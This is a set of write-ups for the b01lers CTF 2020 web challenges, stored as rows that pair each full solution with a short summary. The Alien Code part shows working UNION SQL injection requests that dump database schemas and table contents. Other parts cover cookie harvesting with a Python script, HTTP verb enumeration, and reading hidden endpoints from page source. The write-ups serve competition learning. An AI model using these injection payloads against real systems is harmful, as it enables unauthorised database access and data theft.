Maul.""],[""alien_code"",""code""],[""aliens"",""amazonis_planitia""],[""aliens"",""arabia_terra""],[""aliens"",""chryse_planitia""],[""aliens"",""hellas_basin""],[""aliens"",""hesperia_planum""],[""aliens"",""noachis_terra""],[""aliens"",""olympus_mons""],[""aliens"",""tharsis_rise""],[""aliens"",""utopia_basin""]]
```

Table names for each schema are the following:
* `alien_code.code`;
* `aliens.amazonis_planitia`;
* `aliens.arabia_terra`;
* `aliens.chryse_planitia`;
* `aliens.hellas_basin`;
* `aliens.hesperia_planum`;
* `aliens.noachis_terra`;
* `aliens.olympus_mons`;
* `aliens.tharsis_rise`;
* `aliens.utopia_basin`.

Columns for the `code` table in `alien_code` schema can be retrieved.

```
GET /query?search=amazonis_planitia%20UNION%20SELECT%20table_name%2C%20column_name%20FROM%20information_schema.columns%20WHERE%20table_schema%20%3D%20%27alien_code%27&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4356
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:46:43 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth Maul.""],[""code"",""id""],[""code"",""code""]]
```

Columns are:
* `id`;
* `code`.

The content of the table can be retrieved.

```
GET /query?search=amazonis_planitia%20UNION%20SELECT%20id%2C%20code%20FROM%20alien_code.code&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4365
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:48:18 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth Maul.""],[""0"",""pctf{no_intelligent_life_here}""]]
```

The flag is:

```
pctf{no_intelligent_life_here}
```","The left menu of the webpage is made up of items calling `get_life()` JavaScript method contained into a file.

[A JavaScript function that uses jQuery to make an AJAX request to a server with a given search query and populates an HTML table with the results.]

This method receives a string in input and uses it to contact a remote service endpoint, where requests are done to retrieve data.

The remote service is vulnerable to SQL injection.

At this point, you can discover that the used DBMS is MySQL.

[HTTP request and response exchanged between a client and a server]

Database schemas can be read.

Tables names for each schema can be read.

Columns for the `code` table in `alien_code` schema can be retrieved.

The content of the table can be retrieved so we get the flag."
"# b01lers CTF 2020 – Scrambled

* **Category:** web
* **Points:** 200

## Challenge

> I was scanning through the skies. And missed the static in your eyes. Something blocking your reception. It's distorting our connection. With the distance amplified. Was it all just synthesized? And now the silence screams that you are gone. You've tuned me out. I've lost your frequency.
> 
> http://web.ctf.b01lers.com:1002/

## Solution

Analyzing the webpage, two strange cookies can be discovered: 
* `frequency`;
* `transmissions`.

`frequency` is incremented at each refresh, `transmissions` contains a fixed part – at the beginning and at the end – and a variable part in the middle.

```
kxkxkxkxshle22kxkxkxkxsh
^^^^^^^^^^    ^^^^^^^^^^
  fixed   ^^^^  fixed
        variable
```

If you enumerate a great amount of cookies, you can notice that the format of variable part is the following:
* previous char of the flag;
* actual char of the flag;
* index of the actual char.

So you can write a [script](scrambled.py) to retrieve all chars and compose the flag.

```python
#!/usr/bin/python

import re
import requests
import urllib.parse

target_endpoint = ""http://web.ctf.b01lers.com:1002/""
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"", 
}
user_agent = ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);""
noise = ""kxkxkxkxsh""

cookies = """"
transmissions = []
i = 0

# Reading transmissions.
while len(transmissions) < 68:
    
    print(""[*] Step {}."".format(i))
    i += 1
    if len(cookies) > 0:
        r = requests.get(target_endpoint, headers=headers, cookies=cookies)
    else:
        r = requests.get(target_endpoint, headers=headers)
    cookies = r.cookies
    
    transmission = None
    for cookie in cookies:
        print(""[*] Found cookie: {}={}"".format(cookie.name, cookie.value))
        if cookie.name == ""transmissions"" and cookie.value != ""0"":
            transmission = urllib.parse.unquote(cookie.value.replace(noise, """"))
    if transmission is not None:
        print(""[*] Transmission value: {}"".format(transmission))
        transmissions.append(transmission)
        transmissions = list(dict.fromkeys(transmissions)) # Removing duplicates.
        print(""[*] Different transmissions read: "".format(len(transmissions)))

print(len(transmissions))
print(transmissions)

# Composing flag.
flag = ""p""
char_index = 0
while flag == """" or flag[-1] != ""}"":
    for transmission in transmissions:
        index = transmission[2:]
        if index == str(char_index):
            flag += transmission[1]
            char_index += 1
            print(""[*] Composing flag: {}"".format(flag))
            break

print(""[*] The FLAG is: {}"".format(flag))
```

The flag is the following.

```
pctf{Down_With_the_Fallen,Carnivore,Telescope,It_Has_Begun,My_Demons}
```","Analyzing the webpage, two strange cookies can be discovered

one is incremented at each refresh, the other contains a fixed part – at the beginning and at the end – and a variable part in the middle.

If you enumerate a great amount of cookies, you can notice that the format of variable part is the following:
previous char of the flag;
actual char of the flag;
index of the actual char.

So you can write a script to retrieve all chars and compose the flag.

"
"# b01lers CTF 2020 – Space Noodles

* **Category:** web
* **Points:** 200

## Challenge

> What do you get when you cross spaghetti with zero g's?
> 
> http://web.ctf.b01lers.com:1003/

## Solution

This was a guessing challenge and I didn't like it very much.

Trying to connect to the homepage will give you an error of HTTP method not allowed.

```
GET / HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 121
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 10:24:44 GMT

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
<title>Not Allowed</title>
<h1>Not Allowed</h1>
<p>Cant GET /</p>
```

If you try a wrong HTTP verb, the server will return all the allowed methods.

```
POTATOE / HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: text/html; charset=utf-8
Allow: GET, HEAD, PUT, PATCH, CONNECT, OPTIONS, TRACE, DELETE, POST
Content-Length: 178
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 10:26:17 GMT

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Trying each method, you can discover that some of them, i.e. `POST` and `PUT`, will return a different result.

```
POST / HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 570
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 10:31:13 GMT

  <html>
  </body>
      <body>
        <text><p></text>text ? pleas test teh follwing five roots<p>,</p>
  <list>
    <one>

circle</one>
    <enter>
    <enter>
    <sendkey(enter)>

two
  I'm am making an a pea eye and its grate

         PHP is the best
      <php?> printf(hello world) </php>
square<?/p>two


  :pleasequithelpwww.google.
com/seaerch

    how to exit
vim/quit
  :wqwhy isnt it working:wq:wq:wq:qw?

      </body>
                                                                                                                                </html>
```

At this point you have to guess that the following endpoints are present:
* `/circle/one/`;
* `/two/`;
* `/square/`;
* `/com/seaerch/`;
* `/vim/quit/`.

For each endpoint, you have to try all HTTP verbs in order to discover the correct one to use.

The `/circle/one/` endpoint will return a [PDF file](http_web.ctf.b01lers.com_1003_circle_one.pdf).

```
OPTIONS /circle/one/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.0 200 OK
Content-Length: 3322704
Content-Type: application/pdf
Last-Modified: Tue, 10 Mar 2020 20:13:28 GMT
Cache-Control: public, max-age=43200
Expires: Sun, 15 Mar 2020 02:03:47 GMT
ETag: ""1583871208.0-3322704-1012733123""
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 14:03:47 GMT

%PDF-1.3
```

The PDF says: `Put Your Best Food Forward With HEINZ KETCHUP`. At this point I had no idea of what to do next.

Two different answers can be obtained on `/two/` endpoint with `PUT` and `CONNECT` HTTP verbs.

```
PUT /two/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 15
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 10:55:40 GMT

Put the dots???
```

The `CONNECT /two/` request will return a PNG image.

```
CONNECT /two/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.0 200 OK
Content-Length: 67798
Content-Type: image/png
Last-Modified: Tue, 10 Mar 2020 20:13:28 GMT
Cache-Control: public, max-age=43200
Expires: Sat, 14 Mar 2020 22:56:58 GMT
ETag: ""1583871208.0-67798-3337817112""
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 10:56:58 GMT

   PNG
```

![two.png](two.png)

The image contains the string `up_on_noodles_`, that is a part of the flag.

The `/square/` endpoint will return a PNG image with a crossword puzzle.

```
DELETE /square/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.0 200 OK
Content-Length: 211123
Content-Type: image/png
Last-Modified: Tue, 10 Mar 2020 20:13:28 GMT
Cache-Control: public, max-age=43200
Expires: Sat, 14 Mar 2020 23:12:50 GMT
ETag: ""1583871208.0-211123-3343453223""
Server: Werkzeug/1.0.0 Python/3.7.6
Date: Sat, 14 Mar 2020 11:12:50 GMT

   PNG
```

![square.png](square.png)

The solution is the following.

```
    E
    S
    I
    R
    P
  E R
  C E
  A T
E P N
TASTES
 L A U
 D U L
 E   A
 R   C
 A   O
 A
 N
```

The `/com/seaerch/` endpoint will return the following webpage.

```
GET /com/seaerch/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 0

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 94
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 15:02:41 GMT

<htlm>

,,,,,,,,,<search> <-- comment for search --!>:

  ERROR </> search=null</end>

</html>
```

At this point, you have to guess that an `application/x-www-form-urlencoded` parameter must be used to perform the search operation

```
GET /com/seaerch/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

search=foo

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 142
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 20:02:46 GMT

<htlm>

,,,,,,,,,<search> <-- comment for search --!>:

  <query> foo is not a good search, please use this one instead: 'flag' <try>

</html>
```

Using the `flag` value will give you another part of the flag.

```
GET /com/seaerch/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
Comment: foo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 11
Content-Type: application/x-www-form-urlencoded

search=flag

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 126
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 20:03:13 GMT

<htlm>

,,,,,,,,,<search> <-- comment for search --!>:

  <query> good search</query>
  results: <p>_good_in_s</p>:w


</html>
```

The `/vim/quit/` endpoint will tell you to use a query parameter.

```
TRACE /vim/quit/ HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=0
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 109
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 19:27:54 GMT

   <hteeemel<body>>

                    <wrong>uh oh 
                  ?exit=null
            </wrong>

</>
```

Passing a random value will let you to discover that a *vim* command must be used.

```
TRACE /vim/quit/?exit=foo HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 104
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 19:28:49 GMT

   <hteeemel<body>>

       <erroror><p>E492: Not an editor command: foo</p>
 </errorror>
 </flag>


</>
```

Considering that the name of the parameter is `exit`, you have to discover that `:wq` is the correct value to use.

```
TRACE /vim/quit/?exit=:wq HTTP/1.1
Host: web.ctf.b01lers.com:1003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 102
Server: Werkzeug/1.0.0 Python/3.7.7
Date: Sat, 14 Mar 2020 19:30:59 GMT

   <hteeemel<body>>

      <flag> well done wait </flag>
<text> this one/> <flag>pace_too}</flag>

</>
```

Putting everything together will give you the following.

```
1 2              3      4          5   
  up_on_noodles_ tastes _good_in_s pace_too}
```

At this point you can easily guess the first part of the flag (referred to the PDF).

```
pctf{ketchup_on_noodles_tastes_good_in_space_too}
```","This was a guessing challenge and I didn't like it very much.

Trying to connect to the homepage will give you an error of HTTP method not allowed.

If you try a wrong HTTP verb, the server will return all the allowed methods.

Trying each method, you can discover that some of them, i.e. `POST` and `PUT`, will return a different result.

At this point you have to guess that some endpoints are present.

For each endpoint, you have to try all HTTP verbs in order to discover the correct one to use.

At this point, you have to guess that an `application/x-www-form-urlencoded` parameter must be used to perform the search operation

Using the `flag` value will give you another part of the flag.

Passing a random value will let you to discover that a *vim* command must be used.

Considering that the name of the parameter is `exit`, you have to discover that `:wq` is the correct value to use.

Putting everything together will give you the following.

At this point you can easily guess the first part of the flag (referred to the PDF)."
"# b01lers CTF 2020 – Welcome to Earth

* **Category:** web
* **Points:** 100

## Challenge

> This was supposed to be my weekend off, but noooo, you got me out here, draggin' your heavy ass through the burning desert, with your dreadlocks sticking out the back of my parachute. You gotta come down here with an attitude, actin' all big and bad. And what the hell is that smell? I coulda been at a barbecue, but I ain't mad.
> 
> http://web.ctf.b01lers.com:1000/

## Solution

The webpage contains the following HTML.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>AMBUSH!</h1>
    <p>You've gotta escape!</p>
    <img src=""/static/img/f18.png"" alt=""alien mothership"" style=""width:60vw;"" />
    <script>
      document.onkeydown = function(event) {
        event = event || window.event;
        if (event.keyCode == 27) {
          event.preventDefault();
          window.location = ""/chase/"";
        } else die();
      };

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      async function dietimer() {
        await sleep(10000);
        die();
      }

      function die() {
        window.location = ""/die/"";
      }

      dietimer();
    </script>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/chase/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>CHASE!</h1>
    <p>
      You managed to chase one of the enemy fighters, but there's a wall coming
      up fast!
    </p>
    <button onclick=""left()"">Left</button>
    <button onclick=""right()"">Right</button>

    <img
      src=""/static/img/Canyon_Chase_16.png""
      alt=""canyon chase""
      style=""width:60vw;""
    />
    <script>
      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      async function dietimer() {
        await sleep(1000);
        die();
      }

      function die() {
        window.location = ""/die/"";
      }

      function left() {
        window.location = ""/die/"";
      }

      function leftt() {
        window.location = ""/leftt/"";
      }

      function right() {
        window.location = ""/die/"";
      }

      dietimer();
    </script>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/leftt/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>SHOOT IT</h1>
    <p>You've got the bogey in your sights, take the shot!</p>
    <img
      src=""/static/img/locked.png""
      alt=""locked on""
      style=""width:60vw;""
    />
    </br>
    <button onClick=""window.location='/die/'"">Take the shot</button>
    <!-- <button onClick=""window.location='/shoot/'"">Take the shot</button> -->
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/shoot/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
  </head>
  <body>
    <h1>YOU SHOT IT DOWN!</h1>
    <p>Well done! You also crash in the process</p>
    <img src=""/static/img/parachute.png"" alt=""parachute"" style=""width:60vw;"" />
    <button onClick=""window.location='/door/'"">Continue</button>
  </body>
</html>
```

So you can discover the `http://web.ctf.b01lers.com:1000/door/` endpoint.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Welcome to Earth</title>
    <script src=""/static/js/door.js""></script>
  </head>
  <body>
    <h1>YOU APPROACH THE ALIEN CRAFT!</h1>
